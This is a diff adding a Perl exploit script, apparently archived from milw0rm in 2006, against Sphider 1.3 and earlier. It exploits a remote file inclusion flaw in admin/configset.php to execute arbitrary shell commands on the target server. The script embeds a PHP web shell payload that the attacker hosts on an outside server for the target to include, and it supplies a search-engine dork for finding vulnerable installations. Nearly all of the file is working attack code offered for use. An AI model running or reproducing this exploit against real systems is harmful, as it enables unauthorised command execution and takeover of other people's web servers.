@@ -1,0 +1,59 @@
+#!/usr/bin/perl
+use IO::Socket;
+
+print "\r\nSphider <= 1.3 arbitrary remote inclusion\r\n" ;
+print "-> works with register_globals = On & allow_url_fopen = On\r\n";
+print "by rgod rgod<AT>autistici<DOT>org\r\n";
+print "site: http://retrogod.altervista.org\r\n";
+print "\r\ndork: \"powered by sphider\"\r\n";
+
+sub main::urlEncode {
+    my ($string) = @_;
+    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
+    #$string# =~ tr/.//;
+    return $string;
+ }
+
+$serv=$ARGV[0];
+$path=$ARGV[1];
+$loc=urlEncode($ARGV[2]);
+$cmd=""; for ($i=3; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};
+
+if (@ARGV < 4)
+{
+print "\r\nUsage:\r\n";
+print "perl sphider_xpl.pl server path location command\r\n\r\n";
+print "server         - Server where sphider is installed.\r\n";
+print "path           - Path to sphider (ex: /sphider/ or just /) \r\n";
+print "location       - a site with the code to include (without ending slash)\r\n";
+print "command        - a Unix command\r\n\r\n";
+print "Example:\r\n";
+print "perl sphider_xpl.pl localhost /sphider/ http://192.168.1.3 ls -la\r\n\r\n";
+print "note: on http location you need this code in /conf.php/index.html :\r\n\r\n";
+print "<?php\r\n";
+print "ob_clean();\r\n";
+print "if (get_magic_quotes_gpc())\r\n";
+print "{\$_GET[\"cmd\"]=stripslashes(\$_GET[\"cmd\"]);}\r\n";
+print "ini_set(\"max_execution_time\",0);\r\n";
+print "echo 56789;\r\n";
+print "passthru(\$_GET[\"cmd\"]);\r\n";
+print "die;\r\n";
+print "?>\r\n";
+exit();
+}
+  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
+  or die "[+] Connecting ... Could not connect to host.\n\n";
+  print $sock "GET ".$path."admin/configset.php?cmd=".$cmd."&settings_dir=".$loc." HTTP/1.0\r\n";
+  print $sock "Host: ".$serv."\r\n";
+  print $sock "Connection: Close\r\n\r\n";
+  $out="";
+  while ($answer = <$sock>) {
+    $out.=$answer;
+  }
+  close($sock);
+  @temp= split /56789/,$out,2;
+  if ($#temp>0) {print "\r\nExploit succeeded...\r\n".$temp[1];exit();}
+  #if you are here...
+  print "\r\nExploit failed...\r\n";
+
+# milw0rm.com [2006-04-12]
